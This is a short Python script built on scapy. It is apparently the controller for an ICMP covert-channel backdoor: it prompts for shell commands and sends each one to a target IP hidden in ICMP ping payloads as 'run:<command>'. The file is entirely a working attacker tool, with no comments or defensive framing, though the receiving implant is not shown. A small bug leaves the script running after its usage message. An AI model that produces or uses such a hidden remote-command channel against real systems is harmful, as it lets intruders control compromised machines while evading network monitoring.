import sys
from scapy.all import sr1, IP, ICMP


def run_shell(ip):
    while True:
        try:
            command = input(">> ")
            if send_request(ip, f"run:{command}"):
                print("Shell: the command was sent")
            else:
                print("Shell: something wrong, got no response")
        except KeyboardInterrupt:
            return



def send_request(ip, payload):
    response = sr1(IP(dst=ip)/ICMP()/payload, timeout=1, verbose=0)
    return response is not None



def main():
    if len(sys.argv) != 2:
        print(f'Usage: {sys.argv[0]} IP')
    ip = sys.argv[1]
    if not send_request(ip, "test"):
        print("Shell: test command got no response, exiting...")
        return
    run_shell(ip)
    print("Shell: keyboard interrupt, exiting...")



if __name__ == "__main__":
    main()
    
    

